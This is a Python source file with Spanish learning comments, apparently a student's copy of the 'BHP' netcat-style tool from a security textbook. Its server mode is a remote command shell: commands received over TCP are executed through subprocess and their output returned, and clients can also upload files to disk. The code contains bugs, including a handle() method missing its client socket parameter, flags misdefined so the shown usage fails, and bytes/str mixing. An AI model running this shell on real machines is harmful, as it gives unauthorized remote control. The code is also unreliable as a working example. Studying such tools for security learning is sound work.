import argparse # para recibir argumentos desde linea de comanods
import socket
import threading # para multiples conexiones / hilos
import subprocess # para ejecutar comandos del SO
import shlex # para separar comandos en partes
import sys # sistema (stdin/stdout)
import textwrap  # formatear texto en lineas


# FUNCION EXECUTE PARA EJECUTAR COMANDOS

def execute(cmd):
    """
    Ejecuta un comando del SO y retorna la salida

    Ejemplo de uso de la funcion:
        resultado = execute("whoami")
        print(resultado)  # Imprime: tu_usuario
 
    """

    cmd = cmd.strip() # para elimiinar espacios en el principio y final
    
    if not cmd: # evalua el valor booleano del objeto; "" retorna False
        sys.exit(1)
    # subprocess.check_output() ejecuta el comando y captura salida


    """
    subprocess.check_output():  Ejecuta un comando en el sistema operativo, espera a que termine,
    captura su salida estándar (stdout) y la retorna en formato de bytes.
    Si el comando falla (retorna un código de error distinto de 0),
    lanza una excepción del tipo subprocess.CalledProcessError. 

    shlex.split() : Divide la cadena de comandos en una lista de argumentos
    respetando las comillas (simples o dobles). Por ejemplo, echo "hola mundo"
    se convierte en ['echo', 'hola mundo'] en lugar de ['echo', '"hola', 'mundo"']
    """
    output = subprocess.check_output(
        shlex.split(cmd), # shlex.split Divide una cadena de texto en una lista, respetando comillas simples o dobles.
        stderr=subprocess.STDOUT # Capturar errores tambien
    )

    return output.decode() # Decodifica bytes a texto legible(str)


class NetCat:
    def __init__(self, args, buffer=None):
        """
        Inicializar la clase NetCat
        
        args = argumentos de línea de comandos
        buffer = datos a enviar (puede ser None)
        """

        self.args = args
        self.buffer = buffer

        # Creo el socket aca TCP, para que cuando se llamen las funciones puedan usar el objeto socket 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        """
        setsockopt sirve para cambiar el comportamiento del socket
        recibe tres datos: (level, optname, value)
        
        - Nivel de protocolo: level = SOL_SOCKET = la regla a cambiar, pertenece a la capa general del socket,
        no a una inferior como tcp o ip
        - Opcion elegida: optname = SO_REUSEADDR = Permite que el socket se asocie con bind(),
        a un socket inactivo, que quizas el SO lo toma como ocupado (por razones de seguridad)
        - Nuevo valor (entero generalmente): value = 1 = funciona como BOOL, 1 = True
        (activa la opcion), 0 (desactivar)
        """

        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

    def run(self):
        # Punto de entrada principal
        if self.args.listen:
            self.listen() # modo servidor
        else:
            self.send() # Modo cliente

    # Metodo send - Lado cliente

    def send(self):

        """
        Modo cliente.
        Uso:
        - Conectarse a un servidor que escucha comandos
        - Enviar y ejecutar comandos interactivamente
        """

        # Conectarse al servidor con el socket de la clase netcat
        self.socket.connect((self.args.target, self.args.port))

        # Si tenemos datos en el buffer, como enviar archivo o texto directo al conectar enviarlos primero
        if self.buffer:
            self.socket.send(self.buffer)
            
        try:
            # Loop Interactivo
            while True:
                recv_len = 1
                response = ''

                # recibimos respuesta en bloques de 4096 bytes
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data) # variable para medir el tamaño del bloque recibido
                    response += data.decode()

                    # Si recibo menos de 4096, no hay mas datos
                    if recv_len < 4096:
                        break
                # Imprimir respuesta
                if response:
                    print(response)

                # Pedimos el input del usuario
                self.buffer += input('> ')
                self.buffer += '\n'

                self.socket.send(self.buffer.encode())
        except KeyboardInterrupt:
            print('Interrumpido por usuario...')
            self.socket.close()
            sys.exit()

            """
            Cliente: "¿Hola servidor?"
                ↓
            Servidor: "Hola cliente"
                ↓
            Cliente: Muestra respuesta
                ↓
            Usuario escribe comando
                ↓
            Cliente envía comando
                ↓
            Servidor ejecuta
                ↓
            Servidor envía respuesta
                ↓
            [Repetir desde Cliente: "¿Hola servidor?"]
            """

    def listen(self):

        """
        Modo servidor:
        escucha conexiones entrante
        """

        self.socket.bind((self.args.target, self.args.port))

        self.socket.listen(5) # hasta 5 conexiones en cola

        # Loop infinito esperando clientes, con True
        while True:
            # esperar conexion con accept() (recordar retorna tupla (conn, addrr))
            client_sock, _ = self.socket.accept()

            # Crear un Thread para cada cliente

            client_thread = threading.Thread(
                target=self.handle, # Nota: no le paso handle(), porque no es para ejecutar el metodo ahora, le entrego al hilo el "mapa" de la funcion que luego debe ejecutar
                args=(client_sock,)
            )
            
            client_thread.start()


    def handle(self):

        """
        Todas estos bloques condicionales se ejecutan del lado del servidor
        """
        
        if self.args.execute:
            # Ejecutar el comando SOLO UNA VEZ
            output = execute(self.args.execute)
            client_sock.send(output.encode())

        elif self.args.upload:
            # servidor recibe un archivo del cliente
            file_buffer = b''
            while True:
                data = client_sock.recv(4096) # Acumular los datos
                if data:
                    file_buffer += data
                else:
                    break # si no hay mas datos salir

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)

            mensaje = f'Saved file {self.args.upload}'
            client_sock.send(mensaje.encode())

            """
            flujo archivos:
            Cliente envía archivo
                ↓
            Servidor recibe en bloques
                ↓
            Servidor guarda en disco
                ↓
            Servidor confirma
            """
        elif self.args.command:
            # Shell interactivo completo
            cmd_buffer = b''

            while True:
                try:
                    # Enviar prompt
                    client_sock.send(b'BHP: #> ')
                    # Recibir comando nuevo hasta newline
                    while "\n" not in cmd_buffer.decode():
                        cmd_buffer += client_sock.recv(64)
                    # Ejecutar comando
                    response = execute(cmd_buffer.decode())

                    # Enviar respuesta
                    if response:   
                        client_sock.send(response.encode())
                    # Limpiar buffer
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()
            """
            Flujo (shell interactivo):

            Servidor: "BHP: #> "
                ↓
            Cliente escribe: "whoami"
                ↓
            Servidor recibe: "whoami\n"
                ↓
            Servidor ejecuta: whoami
                ↓
            Servidor envía: "root"
                ↓
            Servidor: "BHP: #> "  [Vuelve al inicio]
                ↓
            Cliente escribe: "ls -la"
                ↓
            [Y así sucesivamente...]
        """

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='BH net tool',
        formatter_class=argparse.RawDescriptionHelpFormatter, # para cambiar como se muestra el texto de ayuda en terminal
        epilog=textwrap.dedent(''' Ejemplo:
        netcat.py -t 192.168.1.108 -p 5555 -l -c # comando interactivo
        netcat.py -t 192.168.1.108 -p 5555 -l -u=archivo.txt # subir archivo
        netcat.py -t 192.168.1.108 -p 5555 -e="whoami" # ejecutar comando
        echo "datos" | netcat.py -t 192.168.1.108 -p 5555 # enviar datos
        netcat.py -t 192.168.1.108 -p 555 # conectar como cliente
        ''')
    )
    # Argumentos
    parser.add_argument('-c', '--command', help='shell interactivo')
    parser.add_argument('-e', '--execute', help='ejecutar comando')
    parser.add_argument('-l', '--listen', help='Poner en modo de escucha/servidor')
    parser.add_argument('-t', '--target', help='IP objetivo')
    parser.add_argument('-p', '--port', help='Puerto',type=int, default=5555)
    parser.add_argument('-u', '--upload', help='subir archivo')

    # Si no se pasó ningún argumento por la terminal, mostrar ayuda y salir
    if len(sys.argv) == 1:
      parser.print_help()
      sys.exit(1)
      
    args = parser.parse_args()

    # si es cliente, leer stdin
    if args.listen:
        buffer = b''
    else:
        buffer = sys.stdin.read().encode()
    # Crear y ejecutar
    nc = NetCat(args, buffer)
    nc.run()

    
